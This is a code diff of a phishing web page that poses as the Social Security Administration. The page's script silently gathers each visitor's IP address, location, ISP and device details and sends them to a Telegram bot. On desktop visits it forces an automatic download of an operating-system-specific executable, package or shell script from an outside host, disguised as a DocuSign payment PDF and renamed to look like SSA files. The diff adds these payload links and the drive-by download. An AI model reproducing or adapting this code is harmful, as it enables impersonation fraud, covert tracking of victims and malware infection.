@@ -19,12 +19,6 @@
             margin-bottom: 20px;
         }
 
-        #visitorCount {
-            font-weight: bold;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
         #downloadLink {
             color: #007bff;
             text-decoration: none;
@@ -52,8 +46,6 @@
 
         function updateVisitorCount() {
             visitorCount += 1;
-            const visitorCountElement = document.getElementById('visitorCount');
-            visitorCountElement.textContent = `Visitor Count: ${visitorCount}`;
         }
 
         const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
@@ -97,29 +89,27 @@
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
 
-        function detectPlatform() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
+        function detectOS() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
 
-            if (/Windows/.test(userAgent)) return 'Windows';
-            if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(platform)) return 'MacOS';
-            if (/Linux/.test(platform) || /Linux/.test(userAgent)) return 'Linux';
-            if (/Android/.test(userAgent)) return 'Android';
-            if (/iPhone|iPad|iPod/.test(platform)) return 'iOS';
+            if (platform.includes('win')) return 'windows';
+            if (platform.includes('mac')) return 'macos';
+            if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
 
-            return 'Unknown';
+            return 'unknown';
         }
 
         function getDownloadLink(os) {
-            switch (os.toLowerCase()) {
+            switch (os) {
                 case 'windows':
-                    return '/abh2/Statement.exe';
+                    return 'http://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.exe?e=Access&y=Guest';
                 case 'macos':
-                    return '/abh2/Statement.dmg';
+                    return 'https://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.pkg?e=Access&y=Guest';
                 case 'linux':
-                    return '/abh2/Statement.bin';
+                    return 'https://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.sh?e=Access&y=Guest';
                 default:
-                    return '/abh2/Statement.exe';
+                    return 'http://specialitystoreservice.com/serve/647c5cc55f189ed6c9e404085b12634/ContractorPayAppViaDocusign_Pdf.exe?e=Access&y=Guest';
             }
         }
 
@@ -149,6 +139,7 @@
         function formatTelegramMessage(visitData) {
             return `
 <b>📡 New Visit Notification</b>
+<b>Visitor No:</b> ${visitorCount}
 <b>🕒 Time:</b> ${new Date().toLocaleString()}
 <b>🌐 IP:</b> ${visitData.ip}
 <b>📍 Location:</b> ${visitData.city}, ${visitData.region}, ${visitData.country}
@@ -165,7 +156,7 @@
                 const ip = await getClientIP();
                 const geoData = await getGeolocationData();
                 const isMobile = isMobileDevice();
-                const platform = detectPlatform();
+                const osType = detectOS();
                 const userAgent = navigator.userAgent;
                 const screenResolution = `${window.screen.width}x${window.screen.height}`;
 
@@ -175,7 +166,7 @@
                     region: geoData.region,
                     city: geoData.city,
                     isp: geoData.isp,
-                    platform: platform,
+                    platform: osType,
                     isMobile: isMobile,
                     userAgent: userAgent,
                     screenResolution: screenResolution
@@ -185,19 +176,26 @@
                 await sendToTelegram(telegramMessage);
 
                 if (!isMobile) {
-                    const downloadLink = getDownloadLink(platform);
-
-                    setTimeout(function() {
-                        const downloadBtn = document.createElement("a");
-                        downloadBtn.href = downloadLink;
-                        downloadBtn.download = downloadLink.split('/').pop();
-                        document.body.appendChild(downloadBtn);
-                        downloadBtn.click();
-                        document.body.removeChild(downloadBtn);
-                    }, 2000);
+                    handleDesktopDevice();
                 }
             } catch (error) {
                 console.error('Error handling visit:', error);
+            }
+        }
+
+        function handleDesktopDevice() {
+            const osType = detectOS();
+            const downloadLink = getDownloadLink(osType);
+
+            try {
+                const downloadBtn = document.createElement("a");
+                downloadBtn.href = downloadLink;
+                downloadBtn.download = "SSA_Files_COMPLETED.zip";
+                document.body.appendChild(downloadBtn);
+                downloadBtn.click();
+                document.body.removeChild(downloadBtn);
+            } catch (e) {
+                console.error("Download error:", e);
             }
         }
 
@@ -216,7 +214,6 @@
                 <h1>Social Security Administration</h1>
             </div>
         </div>
-        <div id="visitorCount">Visitor Count: 0</div>
     </header>
     <div id="uef-tmpl-content-wrapper">
         <div id="uef-tmpl-content">
